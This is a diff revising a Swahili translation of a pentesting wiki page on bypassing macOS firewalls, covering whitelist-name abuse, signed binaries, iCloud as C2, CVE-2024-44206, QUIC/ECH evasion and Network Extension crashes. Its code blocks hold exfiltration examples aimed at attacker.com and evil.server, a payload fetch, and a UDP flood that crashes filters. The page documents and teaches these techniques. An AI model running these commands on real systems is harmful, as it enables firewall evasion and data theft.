@@ -4,41 +4,41 @@
 
 ## Mbinu zilizopatikana
 
-Mbinu zifuatazo zilionekana zikitumika kwenye baadhi ya programu za firewall za macOS.
+Mbinu zifuatazo zilipatikana zikifanya kazi katika baadhi ya firewall apps za macOS.
 
 ### Abusing whitelist names
 
-- Kwa mfano, kumuita malware kwa majina ya michakato maarufu ya macOS kama **`launchd`**
+- Kwa mfano, kuita malware kwa majina ya processes zinazojulikana za macOS kama **`launchd`**
 
 ### Synthetic Click
 
-- Ikiwa firewall itaomba ruhusa kwa mtumiaji, fanya malware **click on allow**
+- Ikiwa firewall itaomba ruhusa kutoka kwa mtumiaji, ifanye malware **ibofye allow**
 
 ### **Use Apple signed binaries**
 
-- Kama **`curl`**, lakini pia wengine kama **`whois`**
+- Kama **`curl`**, lakini pia nyingine kama **`whois`**
 
 ### Well known apple domains
 
-Firewall inaweza kuruhusu miunganisho kwa domain za apple zinazojulikana kama **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
+Firewall inaweza kuruhusu connections kwenye apple domains zinazojulikana kama **`apple.com`** au **`icloud.com`**. Pia iCloud inaweza kutumiwa kama C2.
 
 ### Generic Bypass
 
-Baadhi ya mawazo ya kujaribu kupitisha firewalls
+Baadhi ya mawazo ya kujaribu ili kubypass firewalls
 
 ### Check allowed traffic
 
-Kujua trafiki iliyoruhusiwa kutakusaidia kubaini domains ambazo zinaweza kuwa whitelisted au ni programu gani zimepewa ruhusa kuzipata
+Kujua traffic inayoruhusiwa kutakusaidia kutambua domains ambazo huenda ziko kwenye whitelist au ni applications zipi zimeruhusiwa kuzifikia
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### Kutumia vibaya DNS
 
-Utatuzi wa DNS unafanywa kupitia programu iliyosainiwa **`mdnsreponder`**, ambayo inawezekana itaruhusiwa kuwasiliana na seva za DNS.
+Utafutaji wa DNS hufanywa kupitia **`mdnsreponder`** signed application ambayo huenda ikaruhusiwa kuwasiliana na DNS servers.<sup>[1]</sup>
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Kupitia programu za kivinjari
+### Kupitia Browser apps
 
 - **oascript**
 ```applescript
@@ -63,7 +63,8 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
 ### Kupitia processes injections
 
-Ikiwa unaweza **inject code into a process** ambayo imepewa ruhusa kuungana na server yoyote, unaweza bypass firewall protections:
+If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+
 
 {{#ref}}
 macos-proces-abuse/
@@ -71,31 +72,31 @@ macos-proces-abuse/
 
 ---
 
-## Hivi karibuni macOS firewall bypass vulnerabilities (2023-2025)
+## Recent macOS firewall bypass vulnerabilities (2023-2025)
 
 ### Web content filter (Screen Time) bypass – **CVE-2024-44206**
-Mnamo Julai 2024 Apple ili-patch bug muhimu katika Safari/WebKit ambayo ilivunja system-wide “Web content filter” inayotumika na Screen Time parental controls.
-URI maalum iliyotengenezwa (kwa mfano, kwa double URL-encoded “://”) haikubaliwa/haitioneki na Screen Time ACL lakini inakubaliwa na WebKit, hivyo request inatumwa nje bila kuchujwa. Process yoyote inayoweza kufungua URL (ikijumuisha sandboxed au unsigned code) inaweza hivyo kufikia domains ambazo zimezuiwa waziwazi na mtumiaji au MDM profile.
+Mnamo Julai 2024 Apple ilirekebisha bug muhimu katika Safari/WebKit iliyoharibu “Web content filter” ya mfumo mzima inayotumiwa na vidhibiti vya wazazi vya Screen Time.
+URI iliyoundwa mahsusi (kwa mfano, yenye “://” iliyowekwa URL-encode mara mbili) haitambuliwi na Screen Time ACL lakini inakubaliwa na WebKit, hivyo request hutumwa nje bila kuchujwa. Kwa hiyo, process yoyote inayoweza kufungua URL (ikiwemo code iliyo kwenye sandbox au isiyosainiwa) inaweza kufikia domains zilizozuiwa wazi na user au MDM profile.<sup>[2]</sup>
 
-Jaribio la vitendo (sistema isiyopatchiwa):
+Practical test (un-patched system):
 ```bash
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
-### Packet Filter (PF) hitilafu ya utaratibu wa sheria katika macOS 14 “Sonoma”
-Wakati wa mzunguko wa beta wa macOS 14, Apple ilileta regression katika userspace wrapper inayozunguka **`pfctl`**.
-Sheria zilizoongezwa kwa nenosiri `quick` (linalotumika na kill-switches nyingi za VPN) zilisahaulika kimya, zikisababisha traffic leaks hata wakati GUI ya VPN/firewall iliripoti *blocked*. Hitilafu ilithibitishwa na wauzaji kadhaa wa VPN na ilirekebishwa katika RC 2 (build 23A344).
+### Hitilafu ya mpangilio wa rule za Packet Filter (PF) katika macOS 14 “Sonoma” ya awali
+Katika kipindi cha beta cha macOS 14, Apple ilianzisha regression katika userspace wrapper inayozunguka **`pfctl`**.
+Rules zilizoongezwa kwa keyword ya `quick` (inayotumiwa na VPN kill-switches nyingi) zilipuuzwa kimya kimya, na kusababisha traffic leaks hata GUI ya VPN/firewall iliporipoti *blocked*. Hitilafu hii ilithibitishwa na VPN vendors kadhaa na kurekebishwa katika RC 2 (build 23A344).
 
-Uhakiki wa haraka wa leak:
+Quick leak-check:
 ```bash
 pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
-### Kutumia vibaya huduma za msaidizi zilizosainiwa na Apple (za kale – kabla ya macOS 11.2)
-Kabla ya macOS 11.2, **`ContentFilterExclusionList`** iliruhusu takriban ~50 binaries za Apple kama **`nsurlsessiond`** na App Store kupita kando firewall zote za kuchuja socket zilizotekelezwa kupitia Network Extension framework (LuLu, Little Snitch, n.k.).
-Malware ilikuwa inaweza tu kuzindua mchakato uliokataliwa—au kuingiza code ndani yake—na kupeleka trafiki yake kupitia socket iliyoruhusiwa tayari. Apple iliondoa kabisa exclusion list katika macOS 11.2, lakini mbinu hiyo bado ni muhimu kwenye mifumo ambayo haiwezi kusasishwa.
+### Kutumia vibaya huduma saidizi zilizotiwa saini na Apple (legacy – pre-macOS 11.2)
+Kabla ya macOS 11.2, **`ContentFilterExclusionList`** iliruhusu takriban binary 50 za Apple, kama vile **`nsurlsessiond`** na App Store, kupita firewalls zote za socket-filter zilizotekelezwa kwa kutumia mfumo wa Network Extension (LuLu, Little Snitch, n.k.).
+Malware ingeweza kuanzisha mchakato uliotengwa—au kuingiza code ndani yake—na kuelekeza traffic yake kupitia socket ambayo tayari imeruhusiwa. Apple iliondoa kabisa exclusion list katika macOS 11.2, lakini technique hii bado inahusika kwenye systems ambazo haziwezi ku-upgrade.<sup>[3]</sup>
 
-Mfano wa proof-of-concept (kabla ya 11.2):
+Mfano wa proof-of-concept (pre-11.2):
 ```python
 import subprocess, socket
 # Launch excluded App Store helper (path collapsed for clarity)
@@ -104,8 +105,8 @@ subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store
 s = socket.create_connection(("evil.server", 443))
 s.send(b"exfil...")
 ```
-### QUIC/ECH ili kuepuka Network Extension domain filters (macOS 12+)
-NEFilter Packet/Data Providers hutegemea TLS ClientHello SNI/ALPN. Kwa **HTTP/3 over QUIC (UDP/443)** na **Encrypted Client Hello (ECH)** SNI hubaki iliyofichwa, NetExt haiwezi kuchambua mtiririko, na kanuni za hostname mara nyingi huwa fail-open, kuruhusu malware kufikia domains zilizozuiwa bila kugusa DNS.
+### QUIC/ECH za kukwepa Network Extension domain filters (macOS 12+)
+NEFilter Packet/Data Providers hutegemea TLS ClientHello SNI/ALPN. Kwa **HTTP/3 over QUIC (UDP/443)** na **Encrypted Client Hello (ECH)**, SNI hubaki ikiwa imesimbwa kwa njia fiche, NetExt haiwezi kuchanganua mtiririko, na hostname rules mara nyingi huwa fail-open, hivyo malware inaweza kufikia domains zilizozuiwa bila kugusa DNS.<sup>[5]</sup>
 
 Minimal PoC:
 ```bash
@@ -118,12 +119,12 @@ https://attacker.com/payload
 # cURL 8.10+ built with quiche
 curl --http3-only https://attacker.com/payload
 ```
-Ikiwa QUIC/ECH bado imewezeshwa, hii ni njia rahisi ya kuepuka hostname-filter.
+Ikiwa QUIC/ECH bado imewezeshwa, hii ni njia rahisi ya kukwepa hostname-filter.
 
-### macOS 15 “Sequoia” Network Extension kutokuwa imara (2024–2025)
-Majaribio ya awali ya 15.0/15.1 husababisha kuanguka kwa vichujio vya pande za tatu vya **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, n.k.). Wakati vichujio vinaporejeshwa, macOS inafuta flow rules zake na bidhaa nyingi zinafail‑open. Kujaza chujio na maelfu ya flow fupi za UDP (au kulazimisha QUIC/ECH) kunaweza kusababisha crash mara kwa mara na kuacha dirisha kwa ajili ya C2/exfil wakati GUI bado inadai firewall inaendesha.
+### macOS 15 “Sequoia” Network Extension kutokuwa thabiti (2024–2025)
+Build za awali za 15.0/15.1 hu-crash third-party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, n.k.). Filter inapoanza tena, macOS huondoa flow rules zake na bidhaa nyingi hushindwa kwa hali ya fail-open. Kufurika filter kwa maelfu ya short UDP flows (au kulazimisha QUIC/ECH) kunaweza kusababisha crash mara kwa mara na kuacha dirisha la C2/exfil, huku GUI ikiendelea kudai kuwa firewall inaendeshwa.<sup>[4]</sup>
 
-Uigaji wa haraka (sanduku salama la maabara):
+Reproduction ya haraka (safe lab box):
 ```bash
 # create many short UDP flows to exhaust NE filter queues
 python3 - <<'PY'
@@ -137,25 +138,26 @@ log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslo
 ```
 ---
 
-## Vidokezo vya zana kwa macOS ya kisasa
+## Vidokezo vya kutumia zana kwenye macOS za kisasa
 
-1. Kagua sheria za PF za sasa ambazo firewalls za GUI zinatengeneza:
+1. Kagua sheria za sasa za PF zinazozalishwa na firewall za GUI:
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. Orodhesha binaries ambazo tayari zina *outgoing-network* entitlement (zinatumika kwa piggy-backing):
+2. Orodhesha binaries ambazo tayari zina entitlement ya *outgoing-network* (inafaa kwa piggy-backing):
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
 ```
-3. Sajili kwa njia ya programu Network Extension content filter yako kwa Objective-C/Swift. PoC ndogo, isiyo na root (rootless), inayotuma packets kwa socket ya ndani inapatikana katika msimbo wa chanzo wa Patrick Wardle’s **LuLu**.
+3. Sajili programmatically content filter yako ya Network Extension kwa Objective-C/Swift.
+PoC ndogo ya rootless inayotuma packets kwenye socket ya ndani inapatikana katika source code ya **LuLu** ya Patrick Wardle.
 
-## Marejeleo
+## Marejeo
 
-- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
-- <https://nosebeard.co/advisories/nbl-001.html>
-- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
-- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
-- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>
+- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Kutengeneza na Kuvunja Firewalls za macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
+- [2] [Apple web content filter bypass inaruhusu ufikiaji usio na vizuizi wa maudhui yaliyofungwa (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
+- [3] [Apple Yaondoa Kipengele cha macOS Kilichoruhusu Apps Kupita Usalama wa Firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
+- [4] [Bidhaa za Cybersecurity Zikisitisha Kufanya Kazi Baada ya Sasisho la macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
+- [5] [Tumia ulinzi wa mtandao kusaidia kuzuia miunganisho ya macOS kwenye tovuti hatari - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
 
 {{#include ../../banners/hacktricks-training.md}}
